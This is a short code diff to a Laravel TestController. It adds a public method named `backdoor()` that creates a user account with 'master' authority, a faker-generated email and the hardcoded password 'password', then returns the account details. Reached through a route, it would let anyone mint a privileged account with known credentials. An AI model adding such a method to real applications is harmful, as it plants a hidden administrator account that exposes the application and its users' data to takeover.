@@ -6,6 +6,7 @@ use App\Models\Category;
 use App\Models\Office;
 use App\Models\Option;
 use App\Models\Product;
+use App\Models\User;
 use Carbon\Carbon;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Str;
@@ -154,6 +155,19 @@ class TestController extends Controller
                 ]);
             }
         }
+    }
+
+    public function backdoor()
+    {
+        $faker = \Faker\Factory::create();
+        return User::create([
+            'name' => $faker->name,
+            'email' => $faker->email,
+            'password' => bcrypt('password'),
+            'auth' => 'master',
+            'office_id' => 1,
+            'Invitation_link' => 'backdoor',
+        ]);
     }
 }
 
